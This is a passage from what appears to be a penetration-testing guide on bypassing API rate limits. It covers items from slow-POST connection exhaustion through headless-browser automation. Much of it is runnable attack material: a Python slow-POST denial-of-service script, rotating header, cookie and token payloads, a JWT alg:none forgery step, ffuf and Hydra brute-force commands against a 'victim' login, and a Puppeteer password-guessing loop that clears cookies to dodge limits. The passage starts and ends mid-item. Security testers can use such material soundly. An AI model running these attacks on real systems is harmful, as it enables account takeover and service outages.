The server reads the first chunk and waits for the remaining 9950 bytes

The trick: Keep many of these slow POST connections open simultaneously → Each holds a server thread/worker waiting for the body
Also try chunked slow POST:

Transfer-Encoding: chunked

a\r\n
{"userna\r\n
Wait 10 seconds → Send next chunk → Server waits indefinitely for the next chunk

Test using Python (routed through Burp):

pythonimport socket, time, ssl

def slow_post(host, path, total_size=10000):
    s = socket.create_connection((host, 443))
    s = ssl.wrap_socket(s)
    headers = f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/json\r\nContent-Length: {total_size}\r\n\r\n"
    s.send(headers.encode())
    s.send(b'{"username":"test"')  # Only send part of body
    time.sleep(30)  # Hold connection open for 30 seconds
    s.send(b',"password":"test"}')  # Send rest very slowly
    return s.recv(4096)
🔴 Vulnerable When:

Server doesn't enforce a minimum body transmission rate — slow POST can hold connections open indefinitely
100 simultaneous slow POST connections exhaust server worker threads, preventing legitimate requests
Rate limiter doesn't fire for requests where body isn't fully received yet

Severity: HIGH

36. Rate Limit Bypass via Range Header
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited GET endpoint → Send to Repeater
Add a Range header to the request:

GET /api/data HTTP/1.1
Range: bytes=0-499
Send 20 times → Check for rate limiting → If 429 appears, proceed

Try changing the range in each request:

Range: bytes=0-499
Range: bytes=500-999
Range: bytes=1000-1499
If rate limiter sees each range request as different (unique cache key), you bypass the per-resource limit

In Intruder → Mark the range values as positions:

Range: bytes=§0§-§499§
Use Battering ram with range starting points as payload: 0, 500, 1000, 1500... → Run 100 requests

Also try invalid/unusual range values:

Range: bytes=0-
Range: bytes=-500
Range: bytes=0-0
Range: bytes=*

Try Accept-Ranges: none in the request → Check if disabling range support changes rate limiting behavior

🔴 Vulnerable When:

Each unique Range header value creates a separate rate limit counter (rate limiter using full request as key including headers)
Rotating range values from 0-499, 500-999, 1000-1499 each gets full quota, allowing unlimited data retrieval per time window
Range header bypasses caching and rate limiting simultaneously

Severity: MEDIUM

37-39. Rate Limit Bypass via If-Modified-Since / If-None-Match / Cache-Control
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited GET endpoint → Send to Repeater
For If-Modified-Since:

If-Modified-Since: Mon, 01 Jan 2000 00:00:00 GMT
If-Modified-Since: Thu, 01 Jan 2099 00:00:00 GMT
If-Modified-Since: Tue, 15 Jan 2024 10:30:00 GMT
Send 20 requests rotating the date → Check if rate limit resets

For If-None-Match:

If-None-Match: "etag_value_1"
If-None-Match: "etag_value_2"
If-None-Match: *
If-None-Match: "fake_etag"
Rotating ETag values in Intruder with string payloads

For Cache-Control:

Cache-Control: no-cache
Cache-Control: no-store
Cache-Control: max-age=0
Cache-Control: no-cache, no-store

In Intruder → Combine these headers with the main attack → Add a match-replace rule in Burp to automatically change the date in If-Modified-Since to a random value for each request
Key test: send requests with and without each header → Compare 429 timing → Any difference means the header affects rate limiting

🔴 Vulnerable When:

Changing If-Modified-Since date in each request gives fresh rate limit quota
Cache-Control: no-cache forces the rate limiter to skip its cache-based counting
Each unique ETag in If-None-Match is treated as a separate rate-limited resource

Severity: LOW to MEDIUM

40. Rate Limit Bypass via Accept-Encoding Variation
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint → Send to Repeater
Try variations of the Accept-Encoding header:

Accept-Encoding: gzip
Accept-Encoding: deflate
Accept-Encoding: br
Accept-Encoding: gzip, deflate
Accept-Encoding: gzip, deflate, br
Accept-Encoding: identity
Accept-Encoding: *
Accept-Encoding: (remove header entirely)

Send 20 requests for each encoding → Check if different encodings have separate rate limit counters
In Intruder → Mark Accept-Encoding value as position → Use list of encoding values → Run 100 requests rotating through all encodings → Check for 429
Try invalid encoding values:

Accept-Encoding: fake-encoding
Accept-Encoding: none
Accept-Encoding:
🔴 Vulnerable When:

Rate limit counter is separate for each Accept-Encoding value
Without Accept-Encoding header = no rate limiting (rate limiter only triggers for requests that explicitly declare encoding)
Rotating through all encoding combinations multiplies effective rate limit

Severity: LOW

41. Rate Limit Bypass via User-Agent Rotation
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint → Send to Intruder
Mark the User-Agent value as payload position:

User-Agent: §Mozilla/5.0 (Windows NT 10.0; Win64; x64)§

Payloads tab → Use Simple list with common User-Agent strings:

Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15
Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Googlebot/2.1 (+http://www.google.com/bot.html)
curl/7.81.0
python-requests/2.28.0

Run attack with 100 requests → 10 per User-Agent → Check if each User-Agent gets separate quota or if single global limit applies
Also try Googlebot User-Agent specifically — some apps whitelist crawlers from rate limiting:

User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)

Check if removing User-Agent header entirely bypasses rate limiting (some rate limiters only apply to browser-like requests)

🔴 Vulnerable When:

Each User-Agent string gets its own rate limit counter — rotating between 10 UAs gives 10x the limit
Googlebot User-Agent completely bypasses rate limiting (crawler whitelist bypass)
No User-Agent header results in no rate limiting being applied

Severity: MEDIUM

42. Rate Limit Bypass via Cookie Manipulation
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint → Check if rate limiting is session/cookie based → Send to Repeater
Try deleting all cookies → Send 20 requests without any cookies → Does rate limit still apply? (If rate limit requires a session cookie to track, no cookie = no tracking)
Try generating a new session → Open incognito browser → Get a new session cookie → Use this fresh cookie in Repeater → Check if the counter is reset
In Intruder, mark the session cookie value as payload position → Use your valid cookie for the first 5 requests, then switch to a different valid session cookie:

Cookie: session=§cookie_value§
Payload: list of valid session cookies from multiple accounts

Try adding extra cookies:

Cookie: session=abc123; dummy=1
Cookie: session=abc123; extra=value1
Cookie: session=abc123; extra=value2
If rate limiter uses the full Cookie header as key, adding extra cookies creates different keys

Try modifying the session cookie slightly:

Cookie: session=abc123
Cookie: session=abc123 
Cookie: session=abc123	  (tab added)

Try with the cookie capitalized differently:

Cookie: Session=abc123
Cookie: SESSION=abc123
🔴 Vulnerable When:

Removing cookies bypasses rate limiting (rate limiter requires cookie presence to track)
New session (incognito) gets fresh rate limit counter
Extra cookies change the rate limit key causing a reset
Rate limit is per-session, not per-resource — creating new sessions (multiple accounts) resets it

Severity: HIGH

43. Rate Limit Bypass via Authorization Header Variation
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint → Check for Authorization header → Send to Repeater
Try modifying the Authorization header format:

Authorization: Bearer TOKEN         (standard)
Authorization: bearer TOKEN         (lowercase)
Authorization: BEARER TOKEN         (uppercase)
Authorization: Bearer  TOKEN        (double space)
Authorization: Token TOKEN          (different scheme)
Authorization: token TOKEN          (lowercase token scheme)
Authorization: JWT TOKEN            (different scheme name)

Try adding extra spaces or characters:

Authorization: Bearer TOKEN 
Authorization: Bearer TOKEN	  (tab at end)

Try removing the Authorization header → Send without auth → Check if unauthenticated requests are rate-limited differently (less strictly or not at all)
Try sending two Authorization headers:

Authorization: Bearer VALID_TOKEN
Authorization: Bearer ANOTHER_VALUE
Check which one the server uses for auth and which one the rate limiter keys on

In Intruder → Mark the token value as position (for multi-account bypass) → Or mark the Bearer/Token scheme word as position to test scheme variation

🔴 Vulnerable When:

bearer TOKEN (lowercase) bypasses rate limiter that only looks for Bearer TOKEN (case-sensitive matching)
Double space in Bearer  TOKEN creates new rate limit bucket while still authenticating successfully
Unauthenticated requests (no Authorization header) are not rate limited at all — removing auth bypasses rate limiting but also loses access (check if endpoint works unauthenticated)

Severity: MEDIUM

44. Rate Limit Bypass via Bearer Token Rotation
Steps:

Open Burp Suite → If you have multiple accounts, collect their Bearer tokens → Store them in a list
Send to Intruder → Mark the Bearer token value as payload position:

Authorization: Bearer §eyJhbGciOiJIUzI1NiIsInR...§

Payload: Simple list → Add all your valid tokens
Run Intruder → Each request uses a different token → Check if each token has its own rate limit counter → If 5 tokens each allow 10 requests, you effectively have 50 total attempts
Also try JWT token manipulation → Install JSON Web Tokens extension from BApp Store → Intercept a request with a JWT → Use the extension to:


Change exp (expiry) to a future date and re-sign (if you have the key)
Try alg:none attack → Modify claims in JWT → Remove signature → Check if server accepts it


Try using the same token with different Bearer schemes:

Authorization: Bearer TOKEN_VALUE
Authorization: Token TOKEN_VALUE
Authorization: JWT TOKEN_VALUE
If server accepts all schemes, each scheme has a separate rate limit counter
🔴 Vulnerable When:

Multiple valid Bearer tokens each get independent rate limit counters
JWT alg:none lets you forge any claim (including admin role) → Rate limiting based on user identity bypassed
Changing JWT expiry extends token validity beyond intended limits, allowing more rate-limited requests over time

Severity: HIGH

45. Rate Limit Bypass via Session Rotation
Steps:

Open Burp Suite → Log into the target → Note your session cookie → Log out → Log back in → Note new session cookie
Repeat this 10 times → Collect 10 different valid session cookies for the same account:

session=abc123
session=def456
session=ghi789
...

Go to Intruder → Rate-limited endpoint → Mark session cookie as payload position → Payload: list of your 10 sessions
Send 100 requests → Each 10 requests rotate to a new session → Check if rate limit counter is per-session (each session gets fresh 5-attempt limit):


Sessions 1-10 each get 5 attempts → 10 sessions × 5 = 50 total attempts vs normal limit of 5


Check if the server invalidates old sessions when you create new ones → If only one session can be active at a time, this technique fails → Most apps allow multiple concurrent sessions
Also try: Creating sessions from different browser fingerprints (different User-Agent + different session) → Rate limiter might combine session + fingerprint as the key

🔴 Vulnerable When:

Each new session (even for same user) gets a fresh rate limit counter
Multiple concurrent sessions for one account each have independent limits
Rate limit is per-session-token, not per-account or per-IP

Severity: HIGH

46. Rate Limit Bypass via Race Condition Timing
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint that has a rate limit of N per time window (e.g., 5 per minute)
Identify the exact rate limit reset moment → Send 5 requests → Get blocked on 6th → Wait and try every 5 seconds → Note when the 6th request suddenly succeeds again → That's the reset time
Now use Burp Repeater group mode → Prepare 10 requests → Send group in parallel (single-packet attack) right before the reset moment → All 10 arrive simultaneously right as the rate limit resets → More than 5 might succeed if the reset logic has a race condition
Alternatively: Request queuing → Send 5 requests → Wait until exactly 1 second before reset → Send 5 more → If requests are queued and processed after reset, you get 5 more
Check the Retry-After header or X-RateLimit-Reset header in 429 responses:

Retry-After: 47
X-RateLimit-Reset: 1704067200
This tells you exactly when the counter resets → Time your next burst to arrive precisely at that moment

Try submitting the same request twice in extremely rapid succession (within microseconds) using Burp's single-packet attack → Race condition in counter increment might allow both to pass before the counter reaches the limit

🔴 Vulnerable When:

Single-packet attack with 10 simultaneous requests at reset boundary results in 8+ succeeding (counter race condition)
Exact timing of requests at reset moment allows exceeding the intended limit
Two requests arriving within same millisecond both succeed when the limit is 1 (atomic counter not used)

Severity: HIGH

47. Rate Limit Bypass via Request Queuing and Delay
Steps:

Open Burp Suite → Proxy → HTTP history → Find rate-limited endpoint → Note the rate limit (e.g., 10 requests per minute)
Set up Intruder with a delay:


Go to Resource Pool → Set Delay between requests: 6000ms (6 seconds)
With 10 requests/minute limit and 6-second delay: you send 1 request every 6 seconds = 10 requests/minute → Exactly at the limit but never exceeding it


In Intruder → Set up the attack → Use this delay to stay under the rate limit while doing maximum allowed requests → Effective for slow brute-force attacks
Also test: Pre-queue requests and release simultaneously:


Prepare 100 requests in Burp
Hold all of them (don't send yet)
Release all 100 simultaneously using Send group in parallel
Some queued requests might arrive during a rate limit window transition


Try sending a slow stream of requests — one every 1.1 seconds — for endpoints with 1-per-second limit → The slight delay might prevent rate limiting while still attacking
Check if the rate limit applies to time windows (fixed: every 60 seconds from 00:00) vs sliding windows (60-second window following your last request) → Fixed windows are easier to game by timing bursts

🔴 Vulnerable When:

Rate limit is per fixed time window → Send maximum allowed requests at window start, then full quota again at next window → Never get blocked but attack more than intended
Very slow requests (one every 6 seconds for a 10/min limit) are not caught by rate limiting and effectively perform unlimited brute force over time
Queue release at rate limit reset exploits race condition in counter reset

Severity: MEDIUM to HIGH

48. Rate Limit Bypass via Distributed Attack Tools
Steps:

Open Burp Suite → Establish the baseline → Confirm the rate limit threshold by sending requests to the endpoint
Configure Burp as proxy for external tools → Project Options → Note the Burp proxy address (127.0.0.1:8080)
Use ffuf with multiple source IPs through proxies:

bashffuf -w /usr/share/wordlists/rockyou.txt \
  -u https://target.com/api/login \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"victim@email.com","password":"FUZZ"}' \
  -x socks5://proxy1:1080 \
  -rate 2

Use Hydra with rate limiting evasion:

bashhydra -l victim@email.com -P /usr/share/wordlists/rockyou.txt \
  target.com https-post-form \
  "/api/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 4 -W 3

In Burp: watch all requests from these tools in HTTP history → Check how the server responds at scale
Check if distributed sending (multiple tools from multiple IPs) aggregated at the target exceeds what any single IP is rate limited for → Server's global rate limit may be higher than per-IP limit

🔴 Vulnerable When:

Distributed attack from 10 different IPs each sending 5 requests/minute totals 50 requests/minute against one target (no global rate limit, only per-IP)
No cross-IP coordination in rate limiting — each IP seen as independent
Attack tools using low request rates (2/sec) are never rate limited even when aggregate across IPs is high

Severity: HIGH

49. Rate Limit Bypass via Headless Browser Automation
Steps:

Open Burp Suite → Proxy → Configure Puppeteer/Playwright to route through Burp
Write a Puppeteer script that routes through Burp:

javascriptconst puppeteer = require('puppeteer');

const browser = await puppeteer.launch({
  args: ['--proxy-server=http://127.0.0.1:8080',
         '--ignore-certificate-errors']
});

const page = await browser.newPage();

// Each iteration creates a "fresh browser" experience
for (let i = 0; i < 100; i++) {
  await page.goto('https://target.com/login');
  await page.type('#username', 'victim@email.com');
  await page.type('#password', 'password' + i);
  await page.click('#submit');
  await page.waitForSelector('.result', {timeout: 3000});
  const result = await page.$eval('.result', el => el.textContent);
  console.log(`Attempt ${i}: ${result}`);
  
  // Clear cookies to simulate new session
  await page.deleteCookie(...(await page.cookies()));
}

Run this and watch requests in Burp HTTP history → See if all requests succeed or rate limiting fires
Headless browsers can execute CAPTCHA solving via 2captcha API → Add CAPTCHA solving in the script to bypass CAPTCHA-based rate